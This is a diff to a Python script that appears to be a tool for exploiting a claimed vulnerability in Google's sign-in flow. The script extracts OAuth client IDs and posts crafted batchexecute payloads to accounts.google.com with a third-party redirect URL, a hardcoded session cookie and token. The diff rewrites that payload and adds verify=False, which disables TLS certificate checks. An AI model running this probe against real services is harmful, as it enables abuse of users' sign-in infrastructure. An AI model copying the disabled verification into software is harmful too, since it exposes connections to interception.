@@ -7,8 +7,32 @@ import argparse
 from tqdm import tqdm
 from colorama import init, Fore, Style
 import jsbeautifier
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 init(autoreset=True)
+
+# Define custom color for orange
+class CustomColors:
+    ORANGE = '\033[33m'  # ANSI code for orange/yellow
+
+print(f"""
+{Fore.BLUE}
+            _    __ 
+  ___ _____(_)__/ / 
+ / _ `/ __/ / _  / 
+ \_, /\__/_/\_,_/  
+/___/_                __           
+   / /_  __  ______  / /____  _____
+  / __ \/ / / / __ \/ __/ _ \/ ___/
+ / / / / /_/ / / / / /_/  __/ /    
+/_/ /_/\__,_/_/ /_/\__/\___/_/
+
+{CustomColors.ORANGE}
+Vulnerability was found by Halim Jabbes - 26 June 2024
+@hxlxmj
+""")
 
 def extract_client_id(url):
     parsed_url = urllib.parse.urlparse(url)
@@ -99,13 +123,14 @@ def process_url(url):
             "Cookie": "__Host-GAPS=1:qo5tjYVkpfzrF3EH0jRHUndSlYgjVw:XEtC-4BjS1v1g_5D;",
         }
 
-        data = f'f.req=%5B%5B%5B%22WZfWSd%22%2C%22%5B2%2C1%5D%22%2Cnull%2C%221%22%5D%2C%5B%22etGTrd%22%2C%22%5B%5C%22{client_id}%5C%22%2C%5C%22https%3A%2F%2Fvpn1.volans.tech%5C%22%5D%22%2Cnull%2C%222%22%5D%2C%5B%22Aho3hb%22%2C%22%5B%5D%22%2Cnull%2C%223%22%5D%2C%5B%22i3kFoc%22%2C%22%5B%5D%22%2Cnull%2C%224%22%5D%2C%5B%22zKAP2e%22%2C%22%5B%5C%22identity-signin-password%5C%22%5D%22%2Cnull%2C%226%22%5D%2C%5B%22RzSO2e%22%2C%22%5B%5C%22{client_id}%5C%22%5D%22%2Cnull%2C%227%22%5D%5D%5D&at=ALt4Ve29PZzUxNk6P93qVlYfDpdE%3A1719387079176&'
+        data = f'f.req=%5B%20%5B%20%5B%22WZfWSd%22%2C%20%22%5B2%2C1%5D%22%2C%20null%2C%20%221%22%5D%2C%20%5B%22etGTrd%22%2C%20%22%5B%5C%22{client_id}%5C%22%2C%5C%22https%3A%2F%2Fvpn1.volans.tech%5C%22%5D%22%2C%20null%2C%20%221%22%5D%2C%20%5B%22Aho3hb%22%2C%20%22%5B%5D%22%2C%20null%2C%20%223%22%5D%2C%20%5B%22i3kFoc%22%2C%20%22%5B%5D%22%2C%20null%2C%20%222%22%5D%2C%20%5B%22RzSO2e%22%2C%20%22%5B%5C%22{client_id}%5C%22%5D%22%2C%20null%2C%20%226%22%5D%20%5D%20%5D&at=ALt4Ve29PZzUxNk6P93qVlYfDpdE%3A1719387079176&'
 
         try:
             response = requests.post(
                 "https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute",
                 headers=headers,
-                data=data
+                data=data,
+                verify=False  # Disables SSL verification
             )
 
             if response.status_code == 200:
